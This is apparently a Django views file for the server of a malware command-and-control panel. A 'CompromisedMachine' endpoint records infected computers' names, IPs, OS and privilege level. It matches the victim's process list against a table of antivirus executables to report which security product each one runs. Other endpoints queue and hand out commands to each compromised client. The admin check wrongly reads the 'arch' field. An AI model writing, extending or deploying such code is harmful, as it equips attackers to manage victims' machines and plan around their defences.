from django.shortcuts import render
from rest_framework.views import APIView
from .serializers import ClientSerializer, CommandSerializer
from .models import Client, Command
from rest_framework.response import Response
# Create your views here.

ANTIVIRUS_PROCESSES = {
    "MsMpEng.exe": "Windows Defender",
    "avp.exe": "Kaspersky Antivirus",
    "mcshield.exe": "McAfee Antivirus",
    "avgsvc.exe": "AVG Antivirus",
    "avguard.exe": "Avira Antivirus",
    "nortonsecurity.exe": "Norton Security",
    "ekrn.exe": "ESET NOD32 Antivirus",
    "ashServ.exe": "Avast Antivirus",
    "bdservicehost.exe": "Bitdefender Antivirus",
    "ccSvcHst.exe": "Symantec Endpoint Protection",
    "Smc.exe": "Symantec Endpoint Protection",
    "mfetp.exe": "McAfee Endpoint Security",
    "mfeesp.exe": "McAfee Endpoint Security",
    "SAVService.exe": "Sophos Intercept X",
    "SAVAdminService.exe": "Sophos Intercept X",
    "mbamservice.exe": "Malwarebytes Endpoint Protection",
    "WRSA.exe": "Webroot SecureAnywhere",
    "AvastSvc.exe": "Avast Business Antivirus",
    "AvastUI.exe": "Avast Business Antivirus",
    "F-Secure.exe": "F-Secure Protection Service",
    "SBAMSvc.exe": "VIPRE Advanced Security",
    "PSANHost.exe": "Panda Adaptive Defense",
    "PSUAService.exe": "Panda Adaptive Defense",
    "GDataAVK.exe": "G Data Endpoint Protection",
    "AVKService.exe": "G Data Endpoint Protection",
    "a2service.exe": "Emsisoft Enterprise Security",
    "dwservice.exe": "Dr.Web Enterprise Security Suite",
    "ZAPrivacyService.exe": "ZoneAlarm Anti-Ransomware",
    "BullGuardSvc.exe": "BullGuard Endpoint Security",
    "V3Svc.exe": "AhnLab V3 Endpoint Security",
    "ntrtscan.exe": "Trend Micro Apex One",
    "pccntmon.exe": "Trend Micro Apex One",
    "qhepsvc.exe": "Quick Heal Total Security",
    "n360.exe": "Norton 360",
    "aswidsagent.exe": "Avast IDS Agent",
    "bdagent.exe": "Bitdefender Total Security",
    "vsserv.exe": "Bitdefender Total Security",
    "clientcommunicationservice.exe": "Trend Micro Antivirus",
}



class ClientListView(APIView):
    serializer_class = ClientSerializer
    def get(self, request):
        clients = Client.objects.all()
        serializer = self.serializer_class(clients, many=True)
        return Response(serializer.data, status=200)


class ClientEdit(APIView):
    serializer_class = ClientSerializer

    def get(self, request, id):
        try:
            client = Client.objects.get(id=id)
        except Client.DoesNotExist:
            return Response({"error": "Client not found"}, status=404)
        except:
            return Response({"error": "Bad Request"}, status=400)
        
        serializer = self.serializer_class(client)
        return Response(serializer.data, status=200)

    def put(self, request, id):
        try:
            client = Client.objects.get(id=id)
        except Client.DoesNotExist:
            return Response({"error": "Client not found"}, status=404)
        except:
            return Response({"error": "Bad Request"}, status=400)
        
        serializer = self.serializer_class(client, data=request.data)
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data, status=200)
        return Response(serializer.errors, status=400)


class CommandAPI(APIView):
    serializer_class = CommandSerializer

    def get(self, request):
        commands = Command.objects.all()
        serializer = self.serializer_class(commands, many=True)
        return Response(serializer.data, status=200)

    def post(self, request):
        serializer = self.serializer_class(data=request.data)
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data, status=201)
        return Response(serializer.errors, status=400)

class ClientCommand(APIView):
    serializer_class = CommandSerializer

    def get(self, request, client_id):
        try:
            commands = Command.objects.filter(client=client_id)
        except Command.DoesNotExist:
            return Response({"error": "Commands not found for this client"}, status=404)
        
        serializer = self.serializer_class(commands, many=True)
        return Response(serializer.data, status=200)


class CompromisedMachine(APIView):

    def find_antivirus(self, process):
        for key, value in ANTIVIRUS_PROCESSES.items():
            if key.lower() in process.lower():
                return value
        return "Unknown Antivirus"

    def get_client_ip(self, request):
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        return ip

    def what_todo(self, request):
        ip = self.get_client_ip(request)
        name =request.data.get('name', 'Unknown')
        os = request.data.get('os', 'Unknown')
        process= request.data.get('process', 'Unknown')
        arch = request.data.get('arch', 'Unknown')
        admin = 'Admin' if  request.data.get('arch', 'Unknown') in ["True" , True] else 'No Admin'
        antivirus = self.find_antivirus(process)

        try:
            client= Client.objects.get(pcname=name)
            client.process=process
            client.antivirus=antivirus
            client.status='active'
            client.access= admin
            client.save()        
        except Client.DoesNotExist:
            Client.objects.create(
                pcname=name, 
                ip=ip,
                computer=os,
                process=process,
                antivirus= antivirus,
                access= admin,
                status='active',
            )
    
    def get(self, request):
        # Placeholder for compromised machine logic
        self.what_todo(request)
        return Response({"message": "Compromised machine endpoint"}, status=200)

    def post(self, request):
        # Placeholder for handling compromised machine data
        return Response({"message": "Compromised machine data received"}, status=201)